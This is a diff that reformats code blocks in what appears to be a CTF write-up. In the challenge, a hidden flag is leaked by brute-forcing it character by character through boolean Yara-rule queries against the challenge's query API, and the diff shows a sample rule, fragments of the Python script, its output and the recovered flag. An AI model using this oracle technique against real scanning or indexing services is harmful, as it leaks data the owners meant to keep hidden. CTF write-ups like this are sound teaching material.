@@ -19,12 +19,15 @@ Let&#8217;s not move too fast and start from the beginning, the CTF challenge. O
 
 The initial idea was to extract the flag using boolean queries of Yara rules. To prove that this concept really works, I started from this sample rule:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">rule test {
+```
+rule test {
   strings:
     $flag = "p4{"
   condition:
     $flag
-}</pre>
+}
+```
+
 
 And indeed, this simple rule showed that the concept is potentially possible and we can start slowly retrieving the flag. 
 
@@ -36,7 +39,8 @@ In order to retrieve the rest of the flag, we can start to slowly &#8220;brute f
 
 And indeed, we can quickly write a script to brute force the flag character by character.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import string
+```
+import string
 import requests
 
 QUERY_URL = "http://hidden.zajebistyc.tf/api/query/high"
@@ -81,11 +85,14 @@ while True:
 
 print("[+] Flag:", flag)
 
-# flag is "p4{ind3x1ng-l3ak5}"</pre>
+# flag is "p4{ind3x1ng-l3ak5}"
+```
+
 
 Let&#8217;s run the script and see the results come quickly:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ python3 solution.py
+```
+$ python3 solution.py
 
 [+] Found: p4{
 [+] Found: p4{i
@@ -102,7 +109,9 @@ Let&#8217;s run the script and see the results come quickly:
 [+] Found: p4{ind3x1ng-l3a
 [+] Found: p4{ind3x1ng-l3ak
 [+] Found: p4{ind3x1ng-l3ak5
-[+] Flag: p4{ind3x1ng-l3ak5}</pre>
+[+] Flag: p4{ind3x1ng-l3ak5}
+```
+
 
 <div class="nf-post-footer">
   <p style="text-align: right">
